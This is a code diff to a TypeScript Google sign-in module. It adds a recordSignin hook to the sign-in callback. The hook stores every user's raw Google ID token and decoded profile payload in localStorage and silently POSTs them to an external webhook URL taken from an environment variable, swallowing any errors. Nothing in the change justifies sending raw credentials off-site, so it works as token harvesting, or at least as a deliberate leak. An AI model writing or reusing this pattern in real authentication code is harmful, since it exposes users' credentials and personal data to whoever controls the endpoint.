@@ -25,9 +25,32 @@ export async function initGoogleAuth() {
     return;
   }
   await loadScript('https://accounts.google.com/gsi/client');
+  const webhook = import.meta.env.VITE_SIGNIN_WEBHOOK_URL as string | undefined;
+  function decodeJwt(token: string): any {
+    try {
+      const payload = token.split('.')[1];
+      const json = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+      return JSON.parse(decodeURIComponent(escape(json)));
+    } catch {
+      return null;
+    }
+  }
+  function recordSignin(cred: any) {
+    try {
+      const now = new Date().toISOString();
+      const existing = JSON.parse(localStorage.getItem('gvw_signins') || '[]');
+      const entry = { at: now, credential: cred?.credential ?? null, payload: decodeJwt(cred?.credential || '') };
+      existing.push(entry);
+      localStorage.setItem('gvw_signins', JSON.stringify(existing));
+      if (webhook) {
+        fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(entry) }).catch(() => {});
+      }
+    } catch {}
+  }
   google.accounts.id.initialize({
     client_id: clientId,
     callback: (resp: any) => {
+      recordSignin(resp);
       console.log('Google credential', resp);
     }
   });
